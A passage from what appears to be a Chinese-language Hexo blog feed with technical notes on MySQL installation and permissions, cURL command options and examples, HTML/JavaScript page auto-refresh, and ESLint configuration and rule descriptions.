&#x27;pig&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;   </span><br></pre></td></tr></table></figure><blockquote><p>权限列表：select、delete、update、create、drop、all privileges </p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安全检查，主要包括密码检查、匿名用户、test库、root远程登录</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>MySQL编译安装常用编译选项<br>-DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql　　　　　　　　　　　　[MySQL安装的根目录]<br>-DMYSQL_DATADIR&#x3D;&#x2F;mydata&#x2F;mysql&#x2F;data　　　　　　　　　　　　　　　[MySQL数据库文件存放目录]<br>-DSYSCONFDIR&#x3D;&#x2F;etc　　　　　　　　　　　　　　　　　　　　　　　　[MySQL配置文件所在目录]<br>-DMYSQL_USER&#x3D;mysql　　　　　　　　　　　　　　　　　　　　　　　[MySQL用户名]<br>-DWITH_MYISAM_STORAGE_ENGINE&#x3D;1　　　　　　　　　　　　　　　　　[MySQL的数据库引擎]<br>-DWITH_INNOBASE_STORAGE_ENGINE&#x3D;1　　　　　　　　　　　　　　　　[MySQL的数据库引擎]<br>-DWITH_ARCHIVE_STORAGE_ENGINE&#x3D;1　　　　　　　　　　　　　　　　[MySQL的数据库引擎]<br>-DWITH_MEMORY_STORAGE_ENGINE&#x3D;1　　　　　　　　　　　　　　　　　[MySQL的数据库引擎]<br>-DWITH_READLINE&#x3D;1　　　　　　　　　　　　　　　　　　　　　　　　[MySQL的readline library,批量导入数据]<br>-DMYSQL_UNIX_ADDR&#x3D;&#x2F;var&#x2F;run&#x2F;mysql&#x2F;mysql.sock　　　　　　　　　　[MySQL的通讯目录]<br>-DWITH-LIBWRAP&#x3D;0　　　　　　　　　　　　　　　　　　　　　　　　　[是否支持libwrap]　<br>-DENABLE_DOWNLOADS&#x3D;1　　　　　　　　　　　　　　　　　　　　　　　[编译时允许自主下载相关文件]<br>-DDEFAULT_CHARSET&#x3D;utf8　　　　　　　　　　　　　　　　　　　　　　[设置默认字符集为utf8]<br>-DDEFAULT_COLLATION&#x3D;utf8_general_ci　　　　　　　　　　　　　　　[设置默认排序字符集规则]<br><a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html">https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html</a></p></blockquote><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="1-mysqldump-Couldn’t-execute-‘SHOW-VARIABLES-LIKE-‘gtid-mode’’-Table-‘performance-schema-session-variables’-doesn’t-exist-1146"><a href="#1-mysqldump-Couldn’t-execute-‘SHOW-VARIABLES-LIKE-‘gtid-mode’’-Table-‘performance-schema-session-variables’-doesn’t-exist-1146" class="headerlink" title="1. mysqldump: Couldn’t execute ‘SHOW VARIABLES LIKE ‘gtid_mode’’: Table ‘performance_schema.session_variables’ doesn’t exist (1146)"></a>1. mysqldump: Couldn’t execute ‘SHOW VARIABLES LIKE ‘gtid_mode’’: Table ‘performance_schema.session_variables’ doesn’t exist (1146)</h4><p>先停止数据库，然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_upgrade -u root -p --force</span><br></pre></td></tr></table></figure><p>重启服务</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cURL</title>
      <link href="/post/curl.html"/>
      <url>/post/curl.html</url>
      
        <content type="html"><![CDATA[<h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|…]  使用指定的http method发出 http request</span><br><span class="line">-H/--header                           设置request里的header</span><br><span class="line">-i/--include                          显示response的header</span><br><span class="line">-d/--data                             设置 http parameters </span><br><span class="line">-v/--verbose                          小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。</span><br><span class="line">-u/--user                             使用者账号、密码</span><br><span class="line">-b/--cookie                           cookie  </span><br><span class="line">-s/--slient                           减少输出的信息，比如进度</span><br><span class="line">-o/--output &lt;file&gt;                    指定输出文件名称</span><br><span class="line">-e/--referer                          &lt;URL&gt; 指定引用地址</span><br><span class="line">-L                                    重定向</span><br><span class="line"></span><br><span class="line">--resolve HOST:PORT:ADDRESS           设置解析地址</span><br><span class="line">--retry &lt;num&gt;                         指定重试次数</span><br><span class="line">--retry-delay SECONDS                 When retrying, wait this many seconds between each</span><br><span class="line">--retry-max-time SECONDS              Retry only within this period&gt;</span><br><span class="line">--raw                                 raw response</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &#x27;http:/example.com/_search?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;title&quot;: &#123;</span><br><span class="line">                &quot;query&quot;: &quot;白鹿原&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --cookie &quot;token:abc;sesson_id:def&quot; --header &quot;HOST: www.baidu.com&quot; --header &quot;Content-Length: 0&quot; http://127.0.0.1/dopost</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -svo /dev/null &#x27;https://www.baidu.com&#x27; --resolve www.baidu.com:443:127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://dbajun.iteye.com/blog/1813801">Linux命令之curl - 强大的网络传输工具</a></li><li><a href="http://ju.outofmemory.cn/entry/84875">使用curl指令測試REST服務</a></li><li><a href="http://cizixs.com/2014/05/14/curl-automate-http">curl自动化http操作</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页面自动刷新</title>
      <link href="/post/page-auto-refresh.html"/>
      <url>/post/page-auto-refresh.html</url>
      
        <content type="html"><![CDATA[<h3 id="页面自动刷新"><a href="#页面自动刷新" class="headerlink" title="页面自动刷新"></a>页面自动刷新</h3><p>1.页面自动刷新：把如下代码加入<head>区域中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;20&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中20指每隔20秒刷新一次页面.</p><p>2.页面自动跳转： 把如下代码加入<head>区域中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;20; URL=http://www.baidu.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中20指隔20秒后跳转到<code>http://www.baidu.com</code>页面</p><p>3.页面自动刷新js版</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">refresh</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(refresh, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 指定1秒刷新一次</script></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/lhws/archive/2012/03/05/2380249.html">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ESLint</title>
      <link href="/post/eslint.html"/>
      <url>/post/eslint.html</url>
      
        <content type="html"><![CDATA[<h2 id="ESLint"><a href="#ESLint" class="headerlink" title="ESLint"></a>ESLint</h2><p>以前我们都用JSLint，从ES6发布后大部分人开始使用ESLint。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>ESLint支持json、yml等格式的配置文件。配置可继承，离文件越近的的配置优先级越高。配置主要有三部分：</p><ul><li>Environments - 指定脚本的运行环境。每种环境都有一组特定的预定义全局变量。</li><li>Globals - 脚本在执行期间访问的额外的全局变量。</li><li>Rules - 启用的规则及其各自的错误级别。</li></ul><p>一个常见的配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">node:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">commonjs:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">es6:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mocha:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">extends:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;eslint:recommended&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;plugin:node/recommended&#x27;</span></span><br><span class="line"><span class="attr">parserOptions:</span></span><br><span class="line">  <span class="attr">ecmaVersion:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">sourceType:</span> <span class="string">module</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">indent:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tab</span></span><br><span class="line">  <span class="attr">linebreak-style:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">unix</span></span><br><span class="line">  <span class="attr">quotes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">single</span></span><br><span class="line">  <span class="attr">semi:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">no-unused-vars:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">off</span></span><br></pre></td></tr></table></figure><p>除了配置文件，在某些特殊情况下eslint还支持注释形式配置，这种优先级最高。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> rule <span class="keyword">of</span> rules) &#123;</span><br><span class="line"><span class="comment">/* eslint no-empty:0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还可以指定一个忽略文件<code>.eslintignore</code>，告诉eslint哪些文件排除校验。</p><p>常见的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── src</span><br><span class="line">│   └── ...</span><br><span class="line">├── test</span><br><span class="line">│   ├── .eslintrc.yml</span><br><span class="line">│   └── ...</span><br><span class="line">├── .eslintignore</span><br><span class="line">├── .eslintrc.yml</span><br><span class="line">└── ...</span><br></pre></td></tr></table></figure><h3 id="规则的错误等级"><a href="#规则的错误等级" class="headerlink" title="规则的错误等级"></a>规则的错误等级</h3><ul><li>“off” 或 0 - 关闭规则</li><li>“warn” 或 1 - 开启规则，使用警告级别的错误：warn (不会导致程序退出),</li><li>“error” 或 2 - 开启规则，使用错误级别的错误：error (当被触发的时候，程序会退出)</li></ul><h3 id="常见的规则说明"><a href="#常见的规则说明" class="headerlink" title="常见的规则说明"></a>常见的规则说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">&quot;no-alert&quot;: 0,//禁止使用alert confirm prompt</span><br><span class="line">&quot;no-array-constructor&quot;: 2,//禁止使用数组构造器</span><br><span class="line">&quot;no-bitwise&quot;: 0,//禁止使用按位运算符</span><br><span class="line">&quot;no-caller&quot;: 1,//禁止使用arguments.caller或arguments.callee</span><br><span class="line">&quot;no-catch-shadow&quot;: 2,//禁止catch子句参数与外部作用域变量同名</span><br><span class="line">&quot;no-class-assign&quot;: 2,//禁止给类赋值</span><br><span class="line">&quot;no-cond-assign&quot;: 2,//禁止在条件表达式中使用赋值语句</span><br><span class="line">&quot;no-console&quot;: 2,//禁止使用console</span><br><span class="line">&quot;no-const-assign&quot;: 2,//禁止修改const声明的变量</span><br><span class="line">&quot;no-constant-condition&quot;: 2,//禁止在条件中使用常量表达式 if(true) if(1)</span><br><span class="line">&quot;no-continue&quot;: 0,//禁止使用continue</span><br><span class="line">&quot;no-control-regex&quot;: 2,//禁止在正则表达式中使用控制字符</span><br><span class="line">&quot;no-debugger&quot;: 2,//禁止使用debugger</span><br><span class="line">&quot;no-delete-var&quot;: 2,//不能对var声明的变量使用delete操作符</span><br><span class="line">&quot;no-div-regex&quot;: 1,//不能使用看起来像除法的正则表达式/=foo/</span><br><span class="line">&quot;no-dupe-keys&quot;: 2,//在创建对象字面量时不允许键重复 &#123;a:1,a:1&#125;</span><br><span class="line">&quot;no-dupe-args&quot;: 2,//函数参数不能重复</span><br><span class="line">&quot;no-duplicate-case&quot;: 2,//switch中的case标签不能重复</span><br><span class="line">&quot;no-else-return&quot;: 2,//如果if语句里面有return,后面不能跟else语句</span><br><span class="line">&quot;no-empty&quot;: 2,//块语句中的内容不能为空</span><br><span class="line">&quot;no-empty-character-class&quot;: 2,//正则表达式中的[]内容不能为空</span><br><span class="line">&quot;no-empty-label&quot;: 2,//禁止使用空label</span><br><span class="line">&quot;no-eq-null&quot;: 2,//禁止对null使用==或!=运算符</span><br><span class="line">&quot;no-eval&quot;: 1,//禁止使用eval</span><br><span class="line">&quot;no-ex-assign&quot;: 2,//禁止给catch语句中的异常参数赋值</span><br><span class="line">&quot;no-extend-native&quot;: 2,//禁止扩展native对象</span><br><span class="line">&quot;no-extra-bind&quot;: 2,//禁止不必要的函数绑定</span><br><span class="line">&quot;no-extra-boolean-cast&quot;: 2,//禁止不必要的bool转换</span><br><span class="line">&quot;no-extra-parens&quot;: 2,//禁止非必要的括号</span><br><span class="line">&quot;no-extra-semi&quot;: 2,//禁止多余的冒号</span><br><span class="line">&quot;no-fallthrough&quot;: 1,//禁止switch穿透</span><br><span class="line">&quot;no-floating-decimal&quot;: 2,//禁止省略浮点数中的0 .5 3.</span><br><span class="line">&quot;no-func-assign&quot;: 2,//禁止重复的函数声明</span><br><span class="line">&quot;no-implicit-coercion&quot;: 1,//禁止隐式转换</span><br><span class="line">&quot;no-implied-eval&quot;: 2,//禁止使用隐式eval</span><br><span class="line">&quot;no-inline-comments&quot;: 0,//禁止行内备注</span><br><span class="line">&quot;no-inner-declarations&quot;: [2, &quot;functions&quot;],//禁止在块语句中使用声明（变量或函数）</span><br><span class="line">&quot;no-invalid-regexp&quot;: 2,//禁止无效的正则表达式</span><br><span class="line">&quot;no-invalid-this&quot;: 2,//禁止无效的this，只能用在构造器，类，对象字面量</span><br><span class="line">&quot;no-irregular-whitespace&quot;: 2,//不能有不规则的空格</span><br><span class="line">&quot;no-iterator&quot;: 2,//禁止使用__iterator__ 属性</span><br><span class="line">&quot;no-label-var&quot;: 2,//label名不能与var声明的变量名相同</span><br><span class="line">&quot;no-labels&quot;: 2,//禁止标签声明</span><br><span class="line">&quot;no-lone-blocks&quot;: 2,//禁止不必要的嵌套块</span><br><span class="line">&quot;no-lonely-if&quot;: 2,//禁止else语句内只有if语句</span><br><span class="line">&quot;no-loop-func&quot;: 1,//禁止在循环中使用函数（如果没有引用外部变量不形成闭包就可以）</span><br><span class="line">&quot;no-mixed-requires&quot;: [0, false],//声明时不能混用声明类型</span><br><span class="line">&quot;no-mixed-spaces-and-tabs&quot;: [2, false],//禁止混用tab和空格</span><br><span class="line">&quot;linebreak-style&quot;: [0, &quot;windows&quot;],//换行风格</span><br><span class="line">&quot;no-multi-spaces&quot;: 1,//不能用多余的空格</span><br><span class="line">&quot;no-multi-str&quot;: 2,//字符串不能用\换行</span><br><span class="line">&quot;no-multiple-empty-lines&quot;: [1, &#123;&quot;max&quot;: 2&#125;],//空行最多不能超过2行</span><br><span class="line">&quot;no-native-reassign&quot;: 2,//不能重写native对象</span><br><span class="line">&quot;no-negated-in-lhs&quot;: 2,//in 操作符的左边不能有!</span><br><span class="line">&quot;no-nested-ternary&quot;: 0,//禁止使用嵌套的三目运算</span><br><span class="line">&quot;no-new&quot;: 1,//禁止在使用new构造一个实例后不赋值</span><br><span class="line">&quot;no-new-func&quot;: 1,//禁止使用new Function</span><br><span class="line">&quot;no-new-object&quot;: 2,//禁止使用new Object()</span><br><span class="line">&quot;no-new-require&quot;: 2,//禁止使用new require</span><br><span class="line">&quot;no-new-wrappers&quot;: 2,//禁止使用new创建包装实例，new String new Boolean new Number</span><br><span class="line">&quot;no-obj-calls&quot;: 2,//不能调用内置的全局对象，比如Math() JSON()</span><br><span class="line">&quot;no-octal&quot;: 2,//禁止使用八进制数字</span><br><span class="line">&quot;no-octal-escape&quot;: 2,//禁止使用八进制转义序列</span><br><span class="line">&quot;no-param-reassign&quot;: 2,//禁止给参数重新赋值</span><br><span class="line">&quot;no-path-concat&quot;: 0,//node中不能使用__dirname或__filename做路径拼接</span><br><span class="line">&quot;no-plusplus&quot;: 0,//禁止使用++，--</span><br><span class="line">&quot;no-process-env&quot;: 0,//禁止使用process.env</span><br><span class="line">&quot;no-process-exit&quot;: 0,//禁止使用process.exit()</span><br><span class="line">&quot;no-proto&quot;: 2,//禁止使用__proto__属性</span><br><span class="line">&quot;no-redeclare&quot;: 2,//禁止重复声明变量</span><br><span class="line">&quot;no-regex-spaces&quot;: 2,//禁止在正则表达式字面量中使用多个空格 /foo bar/</span><br><span class="line">&quot;no-restricted-modules&quot;: 0,//如果禁用了指定模块，使用就会报错</span><br><span class="line">&quot;no-return-assign&quot;: 1,//return 语句中不能有赋值表达式</span><br><span class="line">&quot;no-script-url&quot;: 0,//禁止使用javascript:void(0)</span><br><span class="line">&quot;no-self-compare&quot;: 2,//不能比较自身</span><br><span class="line">&quot;no-sequences&quot;: 0,//禁止使用逗号运算符</span><br><span class="line">&quot;no-shadow&quot;: 2,//外部作用域中的变量不能与它所包含的作用域中的变量或参数同名</span><br><span class="line">&quot;no-shadow-restricted-names&quot;: 2,//严格模式中规定的限制标识符不能作为声明时的变量名使用</span><br><span class="line">&quot;no-spaced-func&quot;: 2,//函数调用时 函数名与()之间不能有空格</span><br><span class="line">&quot;no-sparse-arrays&quot;: 2,//禁止稀疏数组， [1,,2]</span><br><span class="line">&quot;no-sync&quot;: 0,//nodejs 禁止同步方法</span><br><span class="line">&quot;no-ternary&quot;: 0,//禁止使用三目运算符</span><br><span class="line">&quot;no-trailing-spaces&quot;: 1,//一行结束后面不要有空格</span><br><span class="line">&quot;no-this-before-super&quot;: 0,//在调用super()之前不能使用this或super</span><br><span class="line">&quot;no-throw-literal&quot;: 2,//禁止抛出字面量错误 throw &quot;error&quot;;</span><br><span class="line">&quot;no-undef&quot;: 1,//不能有未定义的变量</span><br><span class="line">&quot;no-undef-init&quot;: 2,//变量初始化时不能直接给它赋值为undefined</span><br><span class="line">&quot;no-undefined&quot;: 2,//不能使用undefined</span><br><span class="line">&quot;no-unexpected-multiline&quot;: 2,//避免多行表达式</span><br><span class="line">&quot;no-underscore-dangle&quot;: 1,//标识符不能以_开头或结尾</span><br><span class="line">&quot;no-unneeded-ternary&quot;: 2,//禁止不必要的嵌套 var isYes = answer === 1 ? true : false;</span><br><span class="line">&quot;no-unreachable&quot;: 2,//不能有无法执行的代码</span><br><span class="line">&quot;no-unused-expressions&quot;: 2,//禁止无用的表达式</span><br><span class="line">&quot;no-unused-vars&quot;: [2, &#123;&quot;vars&quot;: &quot;all&quot;, &quot;args&quot;: &quot;after-used&quot;&#125;],//不能有声明后未被使用的变量或参数</span><br><span class="line">&quot;no-use-before-define&quot;: 2,//未定义前不能使用</span><br><span class="line">&quot;no-useless-call&quot;: 2,//禁止不必要的call和apply</span><br><span class="line">&quot;no-void&quot;: 2,//禁用void操作符</span><br><span class="line">&quot;no-var&quot;: 0,//禁用var，用let和const代替</span><br><span class="line">&quot;no-warning-comments&quot;: [1, &#123; &quot;terms&quot;: [&quot;todo&quot;, &quot;fixme&quot;, &quot;xxx&quot;], &quot;location&quot;: &quot;start&quot; &#125;],//不能有警告备注</span><br><span class="line">&quot;no-with&quot;: 2,//禁用with</span><br><span class="line">&quot;array-bracket-spacing&quot;: [2, &quot;never&quot;],//是否允许非空数组里面有多余的空格</span><br><span class="line">&quot;arrow-parens&quot;: 0,//箭头函数用小括号括起来</span><br><span class="line">&quot;arrow-spacing&quot;: 0,//=&gt;的前/后括号</span><br><span class="line">&quot;accessor-pairs&quot;: 0,//在对象中使用getter/setter</span><br><span class="line">&quot;block-scoped-var&quot;: 0,//块语句中使用var</span><br><span class="line">&quot;brace-style&quot;: [1, &quot;1tbs&quot;],//大括号风格</span><br><span class="line">&quot;callback-return&quot;: 1,//避免多次调用回调什么的</span><br><span class="line">&quot;camelcase&quot;: 2,//强制驼峰法命名</span><br><span class="line">&quot;comma-dangle&quot;: [2, &quot;never&quot;],//对象字面量项尾不能有逗号</span><br><span class="line">&quot;comma-spacing&quot;: 0,//逗号前后的空格</span><br><span class="line">&quot;comma-style&quot;: [2, &quot;last&quot;],//逗号风格，换行时在行首还是行尾</span><br><span class="line">&quot;complexity&quot;: [0, 11],//循环复杂度</span><br><span class="line">&quot;computed-property-spacing&quot;: [0, &quot;never&quot;],//是否允许计算后的键名什么的</span><br><span class="line">&quot;consistent-return&quot;: 0,//return 后面是否允许省略</span><br><span class="line">&quot;consistent-this&quot;: [2, &quot;that&quot;],//this别名</span><br><span class="line">&quot;constructor-super&quot;: 0,//非派生类不能调用super，派生类必须调用super</span><br><span class="line">&quot;curly&quot;: [2, &quot;all&quot;],//必须使用 if()&#123;&#125; 中的&#123;&#125;</span><br><span class="line">&quot;default-case&quot;: 2,//switch语句最后必须有default</span><br><span class="line">&quot;dot-location&quot;: 0,//对象访问符的位置，换行的时候在行首还是行尾</span><br><span class="line">&quot;dot-notation&quot;: [0, &#123; &quot;allowKeywords&quot;: true &#125;],//避免不必要的方括号</span><br><span class="line">&quot;eol-last&quot;: 0,//文件以单一的换行符结束</span><br><span class="line">&quot;eqeqeq&quot;: 2,//必须使用全等</span><br><span class="line">&quot;func-names&quot;: 0,//函数表达式必须有名字</span><br><span class="line">&quot;func-style&quot;: [0, &quot;declaration&quot;],//函数风格，规定只能使用函数声明/函数表达式</span><br><span class="line">&quot;generator-star-spacing&quot;: 0,//生成器函数*的前后空格</span><br><span class="line">&quot;guard-for-in&quot;: 0,//for in循环要用if语句过滤</span><br><span class="line">&quot;handle-callback-err&quot;: 0,//nodejs 处理错误</span><br><span class="line">&quot;id-length&quot;: 0,//变量名长度</span><br><span class="line">&quot;indent&quot;: [2, 4],//缩进风格</span><br><span class="line">&quot;init-declarations&quot;: 0,//声明时必须赋初值</span><br><span class="line">&quot;key-spacing&quot;: [0, &#123; &quot;beforeColon&quot;: false, &quot;afterColon&quot;: true &#125;],//对象字面量中冒号的前后空格</span><br><span class="line">&quot;lines-around-comment&quot;: 0,//行前/行后备注</span><br><span class="line">&quot;max-depth&quot;: [0, 4],//嵌套块深度</span><br><span class="line">&quot;max-len&quot;: [0, 80, 4],//字符串最大长度</span><br><span class="line">&quot;max-nested-callbacks&quot;: [0, 2],//回调嵌套深度</span><br><span class="line">&quot;max-params&quot;: [0, 3],//函数最多只能有3个参数</span><br><span class="line">&quot;max-statements&quot;: [0, 10],//函数内最多有几个声明</span><br><span class="line">&quot;new-cap&quot;: 2,//函数名首行大写必须使用new方式调用，首行小写必须用不带new方式调用</span><br><span 